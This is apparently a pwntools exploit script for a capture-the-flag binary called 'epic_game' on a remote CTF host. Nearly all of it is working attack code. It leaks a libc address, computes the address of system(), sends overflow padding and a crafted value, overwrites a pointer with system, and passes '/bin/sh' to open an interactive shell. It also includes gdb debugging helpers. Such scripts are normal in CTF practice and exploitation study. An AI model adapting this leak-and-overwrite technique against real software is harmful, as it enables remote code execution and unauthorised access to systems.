from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './app.out'
HOST = 'epic_game.ichsa.ctf.today'
PORT = 8007

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

r.sendlineafter('Choice:\n', '1')
r.sendlineafter('Choice:\n', '/bin/sh')
r.recvuntil('number is ')
leak = int(r.recvuntil('\n', True))
dbg('leak')
if args.D:
	base = leak - 0x4ae90
	system = base + 0x55410
else:
	base = leak - 0x00000000003aef0
	system = base + 0x0000000000449c0
for i in range(0xf):
	r.sendlineafter('Choice:\n', 'A'*0x3e)
r.sendlineafter('Choice:\n', 'A'*0x2e)
payload = ''
payload += 'A'*0x20
payload += 'B'*0x7
# payload += flat(0x1337, 0xfffffffffffffff0)
if args.D:
	debug(r, [0x1392])
r.sendlineafter('Choice:\n', payload)
payload = ''
payload += p64(0xffffffffffffff4f)
r.sendlineafter('Choice:\n', payload)
payload = ''
payload += p64(system)
r.sendlineafter('Choice:\n', payload)

r.interactive()
r.close()
